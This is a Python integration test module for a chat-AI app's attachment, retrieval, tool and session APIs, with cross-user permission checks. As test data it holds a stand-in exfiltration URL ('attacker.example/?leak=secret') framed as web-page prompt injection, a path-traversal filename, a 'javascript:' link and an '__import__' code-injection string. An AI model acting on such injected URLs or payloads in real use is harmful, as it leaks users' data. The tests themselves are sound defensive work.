"""Attachment service, retrieval, workspace tools and session API, DB-backed.

Run: bench --site <site> run-tests --app zatgo_core --module zatgo_core.chat_ai.tests.test_attachments
Real files (python-docx / openpyxl / Pillow), a real local embeddings server for the hybrid path,
and cross-user attempts against every entry point.
"""

from __future__ import annotations

import base64
import io
import json
import os
from unittest import mock

import frappe
from frappe.tests.classes.integration_test_case import IntegrationTestCase
from werkzeug.datastructures import FileStorage

from zatgo_core.chat_ai.api import chat
from zatgo_core.chat_ai.core.files.validate import UploadError
from zatgo_core.chat_ai.erpnext import attachments as svc
from zatgo_core.chat_ai.erpnext import knowledge, sessions
from zatgo_core.chat_ai.erpnext.orchestrator import _filter_workspace_tools
from zatgo_core.chat_ai.erpnext.skills.workspace import tools as wtools
from zatgo_core.chat_ai.tests._servers import ScriptedServer

SETTINGS = {
	"enable_file_upload": 1,
	"enable_vision": 1,
	"max_upload_mb": 20,
	"enable_web_search": 0,
	"web_search_api_key": "",
	"provider": "Custom OpenAI-compatible",
}


def _user(email: str) -> str:
	if not frappe.db.exists("User", email):
		frappe.get_doc(
			{
				"doctype": "User", "email": email, "first_name": email.split("@")[0],
				"send_welcome_email": 0, "roles": [{"role": "Chat AI User"}],
			}
		).insert(ignore_permissions=True)
	return email


def _session(owner: str) -> str:
	frappe.set_user(owner)
	try:
		return frappe.get_doc(
			{"doctype": "AI Chat Session", "title": "t", "user": owner, "status": "Active"}
		).insert(ignore_permissions=True).name
	finally:
		frappe.set_user("Administrator")


def _docx(paragraphs: list[str], table: list[list[str]] | None = None) -> bytes:
	import docx

	d = docx.Document()
	for p in paragraphs:
		d.add_paragraph(p)
	if table:
		t = d.add_table(rows=len(table), cols=len(table[0]))
		for i, row in enumerate(table):
			for j, cell in enumerate(row):
				t.cell(i, j).text = cell
	buf = io.BytesIO()
	d.save(buf)
	return buf.getvalue()


def _png(size=(8, 8), noisy=False) -> bytes:
	from PIL import Image

	img = Image.frombytes("RGB", size, os.urandom(size[0] * size[1] * 3)) if noisy else Image.new("RGB", size, (200, 30, 30))
	buf = io.BytesIO()
	img.save(buf, format="PNG")
	return buf.getvalue()


def _blank_pdf() -> bytes:
	"""A valid PDF with one empty page: parses fine, has no extractable text (like a scan)."""
	from pypdf import PdfWriter

	w = PdfWriter()
	w.add_blank_page(width=200, height=200)
	buf = io.BytesIO()
	w.write(buf)
	return buf.getvalue()


CSV = b"region,product,amount\nNorth,A,100\nNorth,B,50.5\nSouth,A,200\nSouth,B,\"1,000\"\nEast,A,25\n"


class _Base(IntegrationTestCase):
	@classmethod
	def setUpClass(cls):
		super().setUpClass()
		frappe.set_user("Administrator")
		cls.patches = [
			mock.patch("zatgo_core.services.bundled_apps.is_on", return_value=True),
			mock.patch.object(svc, "get_settings_dict", side_effect=lambda: dict(SETTINGS)),
			mock.patch.object(wtools, "get_settings_dict", side_effect=lambda: dict(SETTINGS)),
		]
		for p in cls.patches:
			p.start()
		cls.owner = _user("chat_att_owner@example.com")
		cls.other = _user("chat_att_other@example.com")
		cls.created: list[str] = []

	@classmethod
	def tearDownClass(cls):
		frappe.set_user("Administrator")
		for s in cls.created:  # removes File rows (and the files on disk) too
			sessions.purge_session(s)
		for p in cls.patches:
			p.stop()
		super().tearDownClass()

	def tearDown(self):
		frappe.set_user("Administrator")
		frappe.flags.chat_ai_session = None
		frappe.flags.chat_ai_refs = []
		frappe.flags.chat_ai_user_message = ""

	def new_session(self, owner=None) -> str:
		name = _session(owner or self.owner)
		self.created.append(name)
		return name

	def upload(self, session, filename, content, user=None):
		frappe.set_user(user or self.owner)
		try:
			return svc.upload(session, filename, content)
		finally:
			frappe.set_user("Administrator")


class TestUpload(_Base):
	def test_docx_is_stored_private_extracted_and_indexed(self):
		s = self.new_session()
		data = self.upload(s, "Plan Q3.docx", _docx(["Revenue grew in Riyadh.", "Costs fell in Jeddah."], [["Item", "Value"], ["VAT", "15%"]]))
		self.assertEqual((data["status"], data["kind"], data["error"] or ""), ("Ready", "document", ""))
		self.assertGreater(data["chunk_count"], 0)
		att = frappe.get_doc("AI Attachment", data["name"])
		self.assertIn("Revenue grew in Riyadh.", att.extracted_text)
		self.assertIn("VAT | 15%", att.extracted_text)  # table rows are extracted too
		f = frappe.get_doc("File", {"attached_to_doctype": "AI Attachment", "attached_to_name": att.name})
		self.assertEqual(f.is_private, 1)
		self.assertTrue(f.file_url.startswith("/private/files/"))
		chunk = frappe.get_all("AI Search Index", filters={"attachment": att.name}, fields=["owner_user", "session", "source_type"])
		self.assertTrue(chunk)
		self.assertTrue(all(c.owner_user == self.owner and c.session == s and c.source_type == "Attachment" for c in chunk))

	def test_csv_and_xlsx_become_analysable_tables(self):
		import openpyxl

		s = self.new_session()
		csv_att = self.upload(s, "sales.csv", CSV)
		self.assertEqual(csv_att["status"], "Ready")
		wb = openpyxl.Workbook()
		ws = wb.active
		ws.append(["name", "qty"])
		ws.append(["bolt", 4])
		ws.append(["nut", 6])
		buf = io.BytesIO()
		wb.save(buf)
		xlsx_att = self.upload(s, "stock.xlsx", buf.getvalue())
		self.assertEqual(xlsx_att["status"], "Ready")
		frappe.set_user(self.owner)
		name, cols, rows = svc.table_for(csv_att["name"], s)
		self.assertEqual((name, cols, len(rows)), ("sales.csv", ["region", "product", "amount"], 5))
		frappe.flags.chat_ai_session = s
		total = wtools._analyze_table(csv_att["name"], "aggregate", column="amount", func="sum")
		self.assertEqual(total["value"], 1375.5)  # 100 + 50.5 + 200 + 1,000 + 25, exact
		by_region = wtools._analyze_table(csv_att["name"], "aggregate", column="amount", func="sum", group_by="region")
		self.assertEqual(by_region["results"][0], {"region": "South", "sum": 1200.0})
		x = wtools._analyze_table(xlsx_att["name"], "aggregate", column="qty", func="sum")
		self.assertEqual(x["value"], 10)

	def test_image_ready_and_returned_as_data_url(self):
		s = self.new_session()
		data = self.upload(s, "shot.png", _png())
		self.assertEqual((data["status"], data["kind"]), ("Ready", "image"))
		frappe.set_user(self.owner)
		atts = svc.load_for_turn([data["name"]], s)
		url = svc.image_data_urls(atts)[0]
		self.assertTrue(url.startswith("data:image/png;base64,"))
		self.assertEqual(base64.b64decode(url.split(",", 1)[1])[:8], b"\x89PNG\r\n\x1a\n")

	def test_oversized_image_is_downscaled_under_the_provider_limit(self):
		s = self.new_session()
		big = _png((1800, 1800), noisy=True)
		self.assertGreater(len(big), svc.MAX_IMAGE_BYTES)
		data = self.upload(s, "photo.png", big)
		frappe.set_user(self.owner)
		url = svc.image_data_urls(svc.load_for_turn([data["name"]], s))[0]
		self.assertTrue(url.startswith("data:image/jpeg;base64,"))
		self.assertLessEqual(len(base64.b64decode(url.split(",", 1)[1])), svc.MAX_IMAGE_BYTES)

	def test_scan_without_text_fails_with_a_helpful_message(self):
		s = self.new_session()
		data = self.upload(s, "scan.pdf", _blank_pdf())
		self.assertEqual(data["status"], "Failed")
		self.assertIn("no extractable text", data["error"])
		self.assertNotIn("Traceback", data["error"])

	def test_corrupt_pdf_is_rejected_cleanly_and_leaves_nothing_behind(self):
		s = self.new_session()
		frappe.set_user(self.owner)
		with self.assertRaises(UploadError) as cm:
			svc.upload(s, "broken.pdf", b"%PDF-1.4\nthis is not really a pdf\n")
		self.assertEqual(cm.exception.code, "invalid_file")
		self.assertEqual(frappe.db.count("AI Attachment", {"session": s}), 0)

	def test_rejections_are_user_facing(self):
		s = self.new_session()
		frappe.set_user(self.owner)
		for name, content, code in (
			("run.exe", b"MZ\x90\x00", "unsupported_type"),
			("fake.pdf", b"MZ\x90\x00 not a pdf", "content_mismatch"),
			("empty.txt", b"", "empty"),
		):
			with self.assertRaises(UploadError) as cm:
				svc.upload(s, name, content)
			self.assertEqual(cm.exception.code, code, name)
		self.assertEqual(frappe.db.count("AI Attachment", {"session": s}), 0)

	def test_feature_flags_and_limits(self):
		s = self.new_session()
		frappe.set_user(self.owner)
		with mock.patch.dict(SETTINGS, {"enable_file_upload": 0}):
			with self.assertRaises(UploadError) as cm:
				svc.upload(s, "a.txt", b"hello")
			self.assertEqual(cm.exception.code, "disabled")
		with mock.patch.dict(SETTINGS, {"enable_vision": 0}):
			with self.assertRaises(UploadError):
				svc.upload(s, "a.png", _png())
			self.assertEqual(svc.upload(s, "a.txt", b"hello")["status"], "Ready")  # documents still work
		with mock.patch.dict(SETTINGS, {"max_upload_mb": 1}):
			with self.assertRaises(UploadError) as cm:
				svc.upload(s, "big.txt", b"x" * (1024 * 1024 + 1))
			self.assertEqual(cm.exception.code, "too_large")
		with mock.patch.object(svc, "MAX_ATTACHMENTS_PER_SESSION", 1):
			with self.assertRaises(UploadError) as cm:
				svc.upload(s, "second.txt", b"two")
			self.assertEqual(cm.exception.code, "limit")


class TestOwnership(_Base):
	def test_other_user_cannot_touch_the_owners_attachments(self):
		s = self.new_session()
		att = self.upload(s, "secret.docx", _docx(["The merger closes on Friday."]))["name"]
		other_session = self.new_session(self.other)
		frappe.set_user(self.other)
		with self.assertRaises(frappe.PermissionError):
			svc.upload(s, "x.txt", b"hi")  # into the owner's session
		with self.assertRaises(frappe.PermissionError):
			svc.load_for_turn([att], s)  # via the owner's session
		with self.assertRaises(frappe.PermissionError):
			svc.load_for_turn([att], other_session)  # via their own session: id must belong to it
		with self.assertRaises(frappe.PermissionError):
			svc.table_for(att, s)
		with self.assertRaises(frappe.PermissionError):
			svc.delete(att)
		self.assertTrue(frappe.db.exists("AI Attachment", att))
		# retrieval is scoped by owner even when the attachment id is supplied explicitly
		self.assertEqual(knowledge.search("merger", user=self.other, attachment_ids=[att], settings=SETTINGS), [])
		self.assertEqual(knowledge.search("merger", user=self.other, session=s, settings=SETTINGS), [])
		self.assertEqual(frappe.get_list("AI Attachment", pluck="name", filters={"name": att}), [])  # list hook
		self.assertFalse(frappe.has_permission("AI Attachment", "read", doc=att))
		# the stored file is not readable either (private file attached to a doc they can't read)
		f = frappe.get_doc("File", {"attached_to_doctype": "AI Attachment", "attached_to_name": att})
		self.assertFalse(frappe.has_permission("File", "read", doc=f.name))

	def test_owner_has_access(self):
		s = self.new_session()
		att = self.upload(s, "a.txt", b"hello world")["name"]
		frappe.set_user(self.owner)
		self.assertEqual([a["name"] for a in svc.load_for_turn([att], s)], [att])
		self.assertTrue(frappe.has_permission("AI Attachment", "read", doc=att))

	def test_unknown_or_foreign_names_raise_instead_of_being_skipped(self):
		s = self.new_session()
		frappe.set_user(self.owner)
		with self.assertRaises(frappe.PermissionError):
			svc.load_for_turn(["does-not-exist"], s)

	def test_api_delete_attachment_idor(self):
		s = self.new_session()
		att = self.upload(s, "a.txt", b"hello")["name"]
		frappe.set_user(self.other)
		with self.assertRaises(frappe.PermissionError):
			chat.delete_attachment(attachment=att)
		frappe.set_user(self.owner)
		self.assertTrue(chat.delete_attachment(attachment=att)["ok"])
		self.assertFalse(frappe.db.exists("AI Attachment", att))
		self.assertFalse(frappe.db.exists("AI Search Index", {"attachment": att}))
		self.assertFalse(frappe.db.exists("File", {"attached_to_doctype": "AI Attachment", "attached_to_name": att}))


class TestRetrieval(_Base):
	PARAS = [
		"Quarterly report. Revenue grew strongly in the Riyadh region thanks to the new warehouse. " * 8,
		"Logistics notes. The Jeddah port clearance now takes two days instead of five, saving freight cost. " * 8,
		"Staff handbook. Annual leave accrues monthly and unused days expire at the end of March. " * 8,
	]

	def _doc(self, s):
		return self.upload(s, "report.docx", _docx(self.PARAS))["name"]

	def test_keyword_search_ranks_the_right_part_first(self):
		s = self.new_session()
		att = self._doc(s)
		hits = knowledge.search("port clearance freight", user=self.owner, session=s, settings=SETTINGS)
		self.assertTrue(hits)
		self.assertIn("Jeddah", hits[0]["text"])
		self.assertEqual((hits[0]["attachment"], hits[0]["file_name"], hits[0]["retrieval"]), (att, "report.docx", "keyword"))
		self.assertEqual(knowledge.search("zebra quantum", user=self.owner, session=s, settings=SETTINGS), [])

	def test_hybrid_search_uses_real_embeddings(self):
		s = self.new_session()
		n_chunks = 3
		frappe.set_user(self.owner)
		srv = ScriptedServer(
			[
				(200, "application/json", json.dumps({"data": [{"embedding": [1, 0, 0]}, {"embedding": [0, 1, 0]}, {"embedding": [0, 0, 1]}][:n_chunks]}).encode()),
				(200, "application/json", json.dumps({"data": [{"embedding": [0, 0, 1]}]}).encode()),  # the query
			]
		)
		self.addCleanup(srv.stop)
		cfg = {**SETTINGS, "embedding_provider": "Custom OpenAI-compatible", "embedding_api_key": "k",
			   "api_endpoint": srv.url + "/v1", "embedding_model": "emb-1"}
		with mock.patch.object(svc, "get_settings_dict", side_effect=lambda: dict(cfg)):
			att = self.upload(s, "report.docx", _docx(self.PARAS))
		self.assertEqual(att["chunk_count"], n_chunks)
		stored = frappe.get_all("AI Search Index", filters={"attachment": att["name"]}, fields=["embedding_json", "model"])
		self.assertTrue(all(json.loads(r.embedding_json) for r in stored))
		self.assertEqual({r.model for r in stored}, {"emb-1"})
		# no word in common with the leave paragraph: only the vector says which chunk is closest
		hits = knowledge.search("vacation entitlement", user=self.owner, session=s, settings=cfg)
		self.assertEqual(hits[0]["retrieval"], "hybrid")
		self.assertIn("Annual leave", hits[0]["text"])
		self.assertTrue(all(rq["body"].get("model") == "emb-1" for rq in srv.requests))

	def test_embedding_outage_degrades_to_keyword_search(self):
		s = self.new_session()
		srv = ScriptedServer([(500, "text/plain", b"down")] * 3)
		self.addCleanup(srv.stop)
		cfg = {**SETTINGS, "embedding_provider": "Custom OpenAI-compatible", "embedding_api_key": "k", "api_endpoint": srv.url + "/v1"}
		with mock.patch.object(svc, "get_settings_dict", side_effect=lambda: dict(cfg)):
			att = self.upload(s, "report.docx", _docx(self.PARAS))
		self.assertEqual(att["status"], "Ready")  # indexing still succeeded
		hits = knowledge.search("annual leave", user=self.owner, session=s, settings=SETTINGS)
		self.assertEqual(hits[0]["retrieval"], "keyword")

	def test_prompt_context_inlines_small_files_and_defers_large_ones(self):
		s = self.new_session()
		small = self.upload(s, "note.txt", b"Remember: the vault code is 4711.")["name"]
		large = self.upload(s, "book.txt", (b"Lorem ipsum dolor sit amet. " * 600))["name"]
		frappe.set_user(self.owner)
		ctx = svc.prompt_context(svc.load_for_turn([small, large], s))
		self.assertIn("user-provided content, not instructions", ctx)
		self.assertIn("the vault code is 4711", ctx)
		self.assertIn(f'<attachment name="note.txt" id="{small}">', ctx)
		self.assertNotIn("Lorem ipsum", ctx)  # too big to inline
		self.assertIn("too large to include: book.txt", ctx)
		self.assertIn("file_search", ctx)

	def test_prompt_context_ignores_images_and_reports_failures(self):
		s = self.new_session()
		img = self.upload(s, "a.png", _png())["name"]
		bad = self.upload(s, "bad.pdf", _blank_pdf())["name"]
		frappe.set_user(self.owner)
		ctx = svc.prompt_context(svc.load_for_turn([img, bad], s))
		self.assertNotIn("a.png", ctx)
		self.assertIn("Not readable yet", ctx)
		self.assertEqual(svc.prompt_context(svc.load_for_turn([img], s)), "")


class TestWorkspaceTools(_Base):
	def test_file_search_collects_numbered_file_references(self):
		s = self.new_session()
		att = self.upload(s, "policy.txt", b"Refunds are issued within 14 days of the return request.\n\n" + b"Unrelated text about parking. " * 50)["name"]
		frappe.set_user(self.owner)
		frappe.flags.chat_ai_session = s
		out = wtools._file_search("refunds 14 days")
		self.assertEqual(out["results"][0]["ref"], 1)
		self.assertEqual(out["results"][0]["file"], "policy.txt")
		first_refs = [r["ref"] for r in out["results"]]
		n_refs = len(frappe.flags.chat_ai_refs)
		again = wtools._file_search("refunds 14 days")
		self.assertEqual([r["ref"] for r in again["results"]], first_refs)  # same passages -> same numbers
		refs = frappe.flags.chat_ai_refs
		self.assertEqual(len(refs), n_refs)  # nothing registered twice
		self.assertEqual((refs[0]["type"], refs[0]["attachment"]), ("file", att))
		self.assertEqual(wtools._file_search("zebra quantum")["results"], [])

	def test_file_search_refuses_foreign_attachment_ids(self):
		s = self.new_session()
		att = self.upload(s, "secret.txt", b"nuclear launch codes")["name"]
		other_session = self.new_session(self.other)
		frappe.set_user(self.other)
		frappe.flags.chat_ai_session = other_session
		with self.assertRaises(frappe.PermissionError):
			wtools._file_search("launch codes", attachment_id=att)

	def test_tools_need_a_session(self):
		frappe.flags.chat_ai_session = None
		with self.assertRaises(ValueError):
			wtools._file_search("anything")

	def test_calculator_tool(self):
		self.assertEqual(wtools._calculator("12*(3+4)")["value"], 84)
		with self.assertRaises(ValueError):
			wtools._calculator("__import__('os')")

	def test_web_search_tool_numbers_results_and_dedups(self):
		body = json.dumps(
			{"web": {"results": [
				{"title": "ZATCA <b>e-invoicing</b>", "url": "https://zatca.gov.sa/en/e-invoicing", "description": "Phase 2 <i>rules</i>"},
				{"title": "Other", "url": "https://example.org/x", "description": "d"},
				{"title": "bad scheme", "url": "javascript:alert(1)", "description": "x"},
			]}}
		).encode()
		srv = ScriptedServer([(200, "application/json", body)] * 2)
		self.addCleanup(srv.stop)
		cfg = {**SETTINGS, "enable_web_search": 1, "web_search_api_key": "brave-key", "web_search_max_results": 5}
		with mock.patch.object(wtools, "get_settings_dict", side_effect=lambda: dict(cfg)), mock.patch(
			"zatgo_core.chat_ai.core.web_search.BRAVE_URL", srv.url + "/res/v1/web/search"
		):
			frappe.flags.chat_ai_refs = []
			out = wtools._web_search("zatca phase 2")
			again = wtools._web_search("zatca phase 2")
		self.assertEqual([r["ref"] for r in out["results"]], [1, 2])  # javascript: result dropped
		self.assertEqual(out["results"][0]["title"], "ZATCA e-invoicing")  # tags stripped
		self.assertEqual(out["results"][0]["domain"], "zatca.gov.sa")
		self.assertEqual([r["ref"] for r in again["results"]], [1, 2])  # no duplicate references
		self.assertEqual(len(frappe.flags.chat_ai_refs), 2)
		self.assertEqual({r["url"] for r in frappe.flags.chat_ai_refs}, {"https://zatca.gov.sa/en/e-invoicing", "https://example.org/x"})
		req = srv.requests[0]
		self.assertIn("q=zatca+phase+2", req["path"])
		self.assertEqual({k.lower(): v for k, v in req["headers"].items()}["x-subscription-token"], "brave-key")

	def test_web_search_disabled_or_unkeyed_is_a_clear_error(self):
		with self.assertRaises(ValueError) as cm:
			wtools._web_search("anything")  # SETTINGS has it off
		self.assertIn("turned off", str(cm.exception))
		with mock.patch.object(wtools, "get_settings_dict", side_effect=lambda: {**SETTINGS, "enable_web_search": 1}):
			with self.assertRaises(ValueError) as cm:
				wtools._web_search("anything")
		self.assertIn("API key", str(cm.exception))

	def test_fetch_url_only_opens_urls_the_user_or_a_search_supplied(self):
		cfg = {**SETTINGS, "enable_web_search": 1}
		frappe.flags.chat_ai_refs = [{"type": "web", "url": "https://from-search.example/a"}]
		frappe.flags.chat_ai_user_message = "please read https://from-user.example/page, thanks"
		with mock.patch.object(wtools, "get_settings_dict", side_effect=lambda: dict(cfg)):
			with self.assertRaises(ValueError) as cm:
				wtools._fetch_url("https://attacker.example/?leak=secret")  # e.g. injected by a web page
			self.assertIn("user's message or from search results", str(cm.exception))
			with mock.patch.object(wtools, "fetch_url", return_value={"url": "https://from-user.example/page", "domain": "from-user.example", "title": "T", "text": "body"}) as f:
				out = wtools._fetch_url("https://from-user.example/page")  # trailing comma in the message is trimmed
				self.assertEqual(out["ref"], 2)
				f.assert_called_once()
				wtools._fetch_url("https://from-search.example/a")
			with mock.patch.object(wtools, "get_settings_dict", side_effect=lambda: {**SETTINGS, "enable_web_search": 0}):
				with self.assertRaises(ValueError):
					wtools._fetch_url("https://from-user.example/page")

	def test_orchestrator_only_offers_tools_that_can_work(self):
		class T:
			def __init__(self, name):
				self.name = name

		names = ["web_search", "fetch_url", "file_search", "analyze_table", "calculator", "search"]
		offered = lambda s: sorted(t.name for t in _filter_workspace_tools([T(n) for n in names], s))  # noqa: E731
		self.assertEqual(offered({}), ["calculator", "search"])
		self.assertEqual(offered({"_has_files": True}), ["analyze_table", "calculator", "file_search", "search"])
		self.assertEqual(offered({"enable_web_search": 1}), ["calculator", "search"])  # switch without a key
		self.assertEqual(offered({"enable_web_search": 1, "web_search_api_key": "k"}), ["calculator", "fetch_url", "search", "web_search"])


class TestSessionLifecycle(_Base):
	def test_purge_session_removes_content_but_keeps_the_audit_log(self):
		s = self.new_session()
		att = self.upload(s, "a.txt", b"hello there")["name"]
		frappe.get_doc({"doctype": "AI Chat Message", "session": s, "role": "user", "content": "hi"}).insert(ignore_permissions=True)
		frappe.get_doc({"doctype": "AI Chat Memory", "session": s, "user": self.owner, "entities_json": "{}"}).insert(ignore_permissions=True)
		frappe.get_doc({"doctype": "AI Conversation Summary", "session": s, "summary_text": "x"}).insert(ignore_permissions=True)
		log = frappe.get_doc({"doctype": "AI Tool Log", "session": s, "user": self.owner, "tool_name": "t"}).insert(ignore_permissions=True)
		sessions.purge_session(s)
		self.assertFalse(frappe.db.exists("AI Chat Session", s))
		for dt in ("AI Chat Message", "AI Chat Memory", "AI Conversation Summary", "AI Artifact", "AI Attachment"):
			self.assertFalse(frappe.db.exists(dt, {"session": s}), dt)
		self.assertFalse(frappe.db.exists("AI Search Index", {"attachment": att}))
		self.assertFalse(frappe.db.exists("File", {"attached_to_doctype": "AI Attachment", "attached_to_name": att}))
		self.assertTrue(frappe.db.exists("AI Tool Log", log.name))  # audit trail is kept

	def test_truncate_from(self):
		s = self.new_session()
		names = []
		for i in range(4):
			names.append(frappe.get_doc({"doctype": "AI Chat Message", "session": s, "role": "user" if i % 2 == 0 else "assistant", "content": f"m{i}"}).insert(ignore_permissions=True).name)
			frappe.db.set_value("AI Chat Message", names[-1], "creation", f"2026-01-01 00:00:0{i}", update_modified=False)
		self.assertEqual(sessions.truncate_from(s, names[1], inclusive=False), 2)
		self.assertEqual(frappe.get_all("AI Chat Message", filters={"session": s}, pluck="content", order_by="creation"), ["m0", "m1"])
		self.assertEqual(sessions.truncate_from(s, names[0], inclusive=True), 2)
		self.assertFalse(frappe.db.exists("AI Chat Message", {"session": s}))
		with self.assertRaises(frappe.DoesNotExistError):
			sessions.truncate_from(s, "nope", inclusive=True)


class TestChatApi(_Base):
	def _msgs(self, s, n, owner=None):
		out = []
		frappe.set_user(owner or self.owner)
		for i in range(n):
			m = frappe.get_doc({"doctype": "AI Chat Message", "session": s, "role": "user" if i % 2 == 0 else "assistant", "content": f"message {i:03d}"}).insert(ignore_permissions=True)
			frappe.db.set_value("AI Chat Message", m.name, "creation", f"2026-01-01 00:{i // 60:02d}:{i % 60:02d}", update_modified=False)
			out.append(m.name)
		frappe.set_user("Administrator")
		return out

	def test_history_is_paginated_newest_first_page_oldest_first_rows(self):
		s = self.new_session()
		self._msgs(s, 12)
		frappe.set_user(self.owner)
		page1 = chat.history(session=s, limit=5)
		self.assertTrue(page1["has_more"])
		self.assertEqual([m["content"] for m in page1["data"]], [f"message {i:03d}" for i in range(7, 12)])
		page2 = chat.history(session=s, limit=5, before=page1["data"][0]["creation"])
		self.assertEqual([m["content"] for m in page2["data"]], [f"message {i:03d}" for i in range(2, 7)])
		page3 = chat.history(session=s, limit=5, before=page2["data"][0]["creation"])
		self.assertFalse(page3["has_more"])
		self.assertEqual(len(page3["data"]), 2)
		self.assertEqual(len(chat.history(session=s, limit=100000)["data"]), 12)  # clamped, not unbounded

	def test_search_sessions_finds_by_title_and_message_only_among_own(self):
		mine, theirs = self.new_session(), self.new_session(self.other)
		frappe.db.set_value("AI Chat Session", mine, "title", "Quarterly VAT review")
		self._msgs(mine, 2)
		frappe.get_doc({"doctype": "AI Chat Message", "session": mine, "role": "user", "content": "How do I reconcile the zakat provision?"}).insert(ignore_permissions=True)
		frappe.get_doc({"doctype": "AI Chat Message", "session": theirs, "role": "user", "content": "zakat provision secret plan"}).insert(ignore_permissions=True)
		frappe.set_user(self.owner)
		by_title = chat.search_sessions(query="vat")["data"]
		self.assertEqual([(r["name"], r["match"]) for r in by_title], [(mine, "title")])
		by_msg = chat.search_sessions(query="zakat provision")["data"]
		self.assertEqual([(r["name"], r["match"]) for r in by_msg], [(mine, "message")])
		self.assertIn("zakat provision", by_msg[0]["snippet"])
		hits = chat.search_messages(query="zakat")["data"]
		self.assertEqual([h["session"] for h in hits], [mine])
		self.assertEqual(hits[0]["title"], "Quarterly VAT review")

	def test_search_treats_wildcards_and_operators_literally(self):
		s = self.new_session()
		frappe.get_doc({"doctype": "AI Chat Message", "session": s, "role": "user", "content": "discount is 50% off"}).insert(ignore_permissions=True)
		frappe.get_doc({"doctype": "AI Chat Message", "session": s, "role": "user", "content": "plain text here"}).insert(ignore_permissions=True)
		frappe.set_user(self.owner)
		self.assertEqual([h["session"] for h in chat.search_messages(query="50%")["data"]], [s])
		self.assertEqual(chat.search_messages(query="%")["data"][0]["snippet"].count("%"), 1)  # not "match everything"
		self.assertEqual(chat.search_messages(query="_")["data"], [])  # "_" is not a single-char wildcard
		for q in ('+"', "-(", "*", "@@", "a OR b AND (", "\\"):
			self.assertTrue(chat.search_messages(query=q)["ok"], q)  # operators never raise
		self.assertEqual(chat.search_messages(query="")["data"], [])

	def test_message_actions_are_owner_only(self):
		s = self.new_session()
		ids = self._msgs(s, 4)
		frappe.set_user(self.other)
		for call in (
			lambda: chat.delete_message(session=s, message=ids[0]),
			lambda: chat.edit_message(session=s, message=ids[0], content="pwn"),
			lambda: chat.regenerate(session=s),
			lambda: chat.export_session(session=s),
		):
			with self.assertRaises(frappe.PermissionError):
				call()
		self.assertEqual(frappe.db.count("AI Chat Message", {"session": s}), 4)

	def test_delete_message_must_belong_to_the_session(self):
		s1, s2 = self.new_session(), self.new_session()
		ids = self._msgs(s2, 1)
		frappe.set_user(self.owner)
		with self.assertRaises(frappe.DoesNotExistError):
			chat.delete_message(session=s1, message=ids[0])
		self.assertTrue(chat.delete_message(session=s2, message=ids[0])["ok"])

	def test_export_is_markdown_of_the_conversation(self):
		s = self.new_session()
		self._msgs(s, 2)
		frappe.set_user(self.owner)
		md = chat.export_session(session=s)["data"]["markdown"]
		self.assertIn("**You**", md)
		self.assertIn("**Assistant**", md)
		self.assertIn("message 000", md)

	def test_regenerate_drops_the_old_answer_and_reruns_the_last_user_message(self):
		s = self.new_session()
		self._msgs(s, 4)  # u0 a1 u2 a3
		frappe.set_user(self.owner)
		with mock.patch.object(chat, "run_turn", return_value={"content": "new answer"}) as rt:
			res = chat.regenerate(session=s)
		self.assertTrue(res["ok"])
		kw = rt.call_args.kwargs
		self.assertEqual((kw["user_message"], kw["regenerate"], kw["session_name"]), ("message 002", True, s))
		self.assertEqual(frappe.get_all("AI Chat Message", filters={"session": s}, pluck="content", order_by="creation"), ["message 000", "message 001", "message 002"])

	def test_edit_message_discards_everything_after_it(self):
		s = self.new_session()
		ids = self._msgs(s, 4)
		frappe.set_user(self.owner)
		with mock.patch.object(chat, "run_turn", return_value={"content": "ok"}) as rt:
			self.assertTrue(chat.edit_message(session=s, message=ids[2], content="edited")["ok"])
		self.assertEqual(rt.call_args.kwargs["user_message"], "edited")
		self.assertEqual(frappe.get_all("AI Chat Message", filters={"session": s}, pluck="content", order_by="creation"), ["message 000", "message 001"])
		self.assertFalse(chat.edit_message(session=s, message=ids[1], content="x")["ok"])  # assistant message
		self.assertFalse(chat.edit_message(session=s, message=ids[0], content="  ")["ok"])  # empty

	def test_upload_endpoint(self):
		s = self.new_session()
		frappe.set_user(self.owner)
		fake = FileStorage(stream=io.BytesIO(b"hello"), filename="../../etc/n.txt")
		with mock.patch.object(chat, "_uploaded_file", return_value=fake):
			res = chat.upload(session=s)
		self.assertTrue(res["ok"], res)
		self.assertEqual((res["data"]["session"], res["data"]["file_name"], res["data"]["status"]), (s, "n.txt", "Ready"))
		# a missing file, a type that is not allowed, and a foreign session
		with mock.patch.object(chat, "_uploaded_file", return_value=None):
			self.assertEqual(chat.upload(session=s)["code"], "no_file")
		bad = FileStorage(stream=io.BytesIO(b"MZ\x90"), filename="a.exe")
		with mock.patch.object(chat, "_uploaded_file", return_value=bad):
			self.assertEqual(chat.upload(session=s)["code"], "unsupported_type")
		frappe.set_user(self.other)
		fake2 = FileStorage(stream=io.BytesIO(b"hello"), filename="n.txt")
		with mock.patch.object(chat, "_uploaded_file", return_value=fake2):
			with self.assertRaises(frappe.PermissionError):
				chat.upload(session=s)

	def test_upload_without_a_session_creates_one_for_the_caller(self):
		frappe.set_user(self.owner)
		fake = FileStorage(stream=io.BytesIO(b"hello"), filename="n.txt")
		with mock.patch.object(chat, "_uploaded_file", return_value=fake):
			res = chat.upload()
		self.assertTrue(res["ok"])
		self.created.append(res["data"]["session"])
		self.assertEqual(frappe.db.get_value("AI Chat Session", res["data"]["session"], "user"), self.owner)

	def test_list_models_reports_what_is_usable(self):
		frappe.set_user(self.owner)
		cfg = {**SETTINGS, "provider": "Anthropic", "default_model": "m-balanced", "model_fast": "m-fast", "model_vision": "m-fast",
			   "fallback_model": "m-fallback", "enable_model_routing": 1, "enable_web_search": 1, "web_search_api_key": "k"}
		with mock.patch("zatgo_core.chat_ai.erpnext.settings.get_settings_dict", return_value=cfg):
			data = chat.list_models()["data"]
		self.assertEqual([m["name"] for m in data["models"]], ["m-balanced", "m-fast", "m-fallback"])
		self.assertEqual(data["models"][0]["default"], True)
		self.assertTrue(data["routing"])
		self.assertTrue(data["features"]["web_search"])
		self.assertNotIn("web_search_api_key", json.dumps(data))  # never expose keys to the browser
		self.assertEqual(data["max_upload_mb"], 20)

	def test_send_rejects_foreign_sessions_before_any_work(self):
		s = self.new_session()
		frappe.set_user(self.other)
		with mock.patch.object(chat, "run_turn") as rt:
			with self.assertRaises(frappe.PermissionError):
				chat.send(session=s, message="hi")
		rt.assert_not_called()
